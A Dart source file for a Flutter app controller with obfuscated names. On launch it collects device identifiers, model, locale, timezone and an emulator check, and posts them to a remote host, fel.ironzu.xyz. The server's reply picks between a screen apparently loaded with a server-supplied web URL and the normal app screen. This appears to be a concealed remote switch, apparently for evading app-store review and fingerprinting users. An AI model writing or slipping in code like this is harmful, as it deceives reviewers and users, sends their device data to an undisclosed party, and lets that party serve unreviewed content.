import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var hunowvy = RxBool(false);
  var lvetixbzsm = RxBool(true);
  var vebwlt = RxString("");
  var sonya = RxBool(false);
  var smith = RxBool(true);
  final nhgufec = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    rqyim();
  }


  Future<void> rqyim() async {

    sonya.value = true;
    smith.value = true;
    lvetixbzsm.value = false;

    nhgufec.post("https://fel.ironzu.xyz/Lxnlko8Al8",data: await ednwtvszya()).then((value) {
      var iestr = value.data["iestr"] as String;
      var dowl = value.data["dowl"] as bool;
      if (dowl) {
        vebwlt.value = iestr;
        vernie();
      } else {
        will();
      }
    }).catchError((e) {
      lvetixbzsm.value = true;
      smith.value = true;
      sonya.value = false;
    });
  }

  Future<Map<String, dynamic>> ednwtvszya() async {
    final DeviceInfoPlugin rbvl = DeviceInfoPlugin();
    PackageInfo uzthlcka_kgfna = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bawnsylm = Platform.localeName;
    var ZyTsnHo = currentTimeZone;

    var whPGX = uzthlcka_kgfna.packageName;
    var mgwUCb = uzthlcka_kgfna.version;
    var covitSRa = uzthlcka_kgfna.buildNumber;

    var Govgh = uzthlcka_kgfna.appName;
    var eileenRutherford = "";
    var majorMcLaughlin = "";
    var XsZK  = "";
    var shayneGrady = "";
    var devanWard = "";
    var uikdhKnS = "";
    var aaronKling = "";
    var coryWisozk = "";

    var iTwcKx = "";

    var LnBUvGf = "";
    var UHDBF = false;

    if (GetPlatform.isAndroid) {
      LnBUvGf = "android";
      var azvgtdok = await rbvl.androidInfo;

      uikdhKnS = azvgtdok.brand;

      iTwcKx  = azvgtdok.model;
      XsZK = azvgtdok.id;

      UHDBF = azvgtdok.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      LnBUvGf = "ios";
      var nvjefxoqi = await rbvl.iosInfo;
      uikdhKnS = nvjefxoqi.name;
      iTwcKx = nvjefxoqi.model;

      XsZK = nvjefxoqi.identifierForVendor ?? "";
      UHDBF  = nvjefxoqi.isPhysicalDevice;
    }
    var res = {
      "whPGX": whPGX,
      "covitSRa": covitSRa,
      "mgwUCb": mgwUCb,
      "ZyTsnHo": ZyTsnHo,
      "uikdhKnS": uikdhKnS,
      "aaronKling" : aaronKling,
      "XsZK": XsZK,
      "Govgh": Govgh,
      "bawnsylm": bawnsylm,
      "shayneGrady" : shayneGrady,
      "iTwcKx": iTwcKx,
      "LnBUvGf": LnBUvGf,
      "UHDBF": UHDBF,
      "devanWard" : devanWard,
      "majorMcLaughlin" : majorMcLaughlin,
      "coryWisozk" : coryWisozk,
      "eileenRutherford" : eileenRutherford,

    };
    return res;
  }

  Future<void> will() async {
    Get.offAllNamed("/colorTab");
  }

  Future<void> vernie() async {
    Get.offAllNamed("/colorLong");
  }

}
